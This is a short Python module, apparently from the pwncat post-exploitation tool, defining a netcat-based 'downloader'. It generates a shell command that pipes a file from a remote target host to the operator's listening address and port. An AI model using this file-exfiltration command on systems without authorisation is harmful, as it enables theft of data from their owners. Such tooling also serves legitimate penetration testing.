#!/usr/bin/env python3
from typing import Generator
import shlex

from pwncat.downloader.base import RawDownloader, DownloadError


class NetcatDownloader(RawDownloader):

    BINARIES = ["nc"]

    def command(self) -> Generator[str, None, None]:
        """ Return the commands needed to trigger this download """

        lhost = self.pty.vars["lhost"]
        lport = self.server.server_address[2]
        nc = self.pty.which("nc")
        remote_file = shlex.quote(self.remote_path)

        yield f"{nc} {lhost} {lport} < {remote_file}"
